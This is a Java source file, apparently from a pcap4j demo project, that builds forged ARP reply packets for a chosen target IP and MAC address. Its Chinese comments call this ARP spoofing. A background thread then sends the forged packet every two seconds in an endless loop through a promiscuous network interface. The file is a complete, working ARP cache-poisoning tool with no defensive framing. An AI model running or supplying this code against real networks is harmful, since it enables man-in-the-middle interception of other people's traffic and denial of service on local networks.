package com.rbac.demo.pcap4j;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import org.pcap4j.core.*;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;


public class ArpReply {
    private static final String SNAPLEN_KEY = ArpReply.class.getName() + ".snaplen";
    private static final int SNAPLEN = Integer.getInteger(SNAPLEN_KEY, 65536); // [bytes]
    public ArpReply() {
    }
    /**
     * ARPspoofing方法构造arp欺骗包
     *
     * */
    public Packet ARPSpoofing(Map<String, String> dest, String srcMac, String strSrcIpAddress){
        Set<String> keySet = dest.keySet();
        Iterator<String> iterator = keySet.iterator();
            String key = iterator.next();
            MacAddress DES_MAC_ADDR = MacAddress.getByName(dest.get(key));
            MacAddress SRC_MAC_ADDR = MacAddress.getByName(srcMac);
            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            try {
                /**
                 * 构造三层包头
                 *
                 * */
                arpBuilder
                        .hardwareType(ArpHardwareType.ETHERNET)
                        .protocolType(EtherType.IPV4)
                        .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                        .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                        .operation(ArpOperation.REPLY)
                        .srcHardwareAddr(SRC_MAC_ADDR)
                        .srcProtocolAddr(InetAddress.getByName(strSrcIpAddress))
                        .dstHardwareAddr(DES_MAC_ADDR)
                        .dstProtocolAddr(InetAddress.getByName(key));
            } catch (UnknownHostException e) {
                throw new IllegalArgumentException(e);
            }
        /**
         * 构造二层包头
         *
         * */
            EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
            etherBuilder
                    .dstAddr(DES_MAC_ADDR)
                    .srcAddr(SRC_MAC_ADDR)
                    .type(EtherType.ARP)
                    .payloadBuilder(arpBuilder)
                    .paddingAtBuild(true);
            Packet p = etherBuilder.build();
            return p;

    }
    public ExecutorService createThread(Map<String, String> dest, String srcMac, String strSrcIpAddress,String netCardIp) throws PcapNativeException, UnknownHostException {
        Packet p=this.ARPSpoofing(dest,srcMac,strSrcIpAddress);
        InetAddress inetAddress = InetAddress.getByName(netCardIp);
        PcapNetworkInterface nif = Pcaps.getDevByAddress(inetAddress);
        ExecutorService pool = Executors.newSingleThreadExecutor();   //新建单线程池
        PcapHandle sendHandle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, 2000);
        task t=new task(sendHandle,p,nif);
        pool.execute(t);//开启线程
        return pool;  //返回线程实例
    }
    private class task implements Runnable {
        private PcapHandle handle;
        private Packet p;
        private PcapNetworkInterface nif;
        public task(PcapHandle handle, Packet p,PcapNetworkInterface nif) {
            this.handle = handle;
            this.p = p;
            this.nif=nif;
        }
        @Override
        public void run() {
                    while (true) {
                        try {
                            if(!handle.isOpen()) {
                                /**
                                 * 每隔2秒发送一个arp欺骗包
                                 * */
                                handle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, 2000);
                            }
                            handle.sendPacket(p);
                            Thread.sleep(2000);
                        } catch (PcapNativeException e) {
                            e.printStackTrace();
                        } catch (NotOpenException e) {
                            e.printStackTrace();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }finally {
                        }
                    }
                }
        }
    }
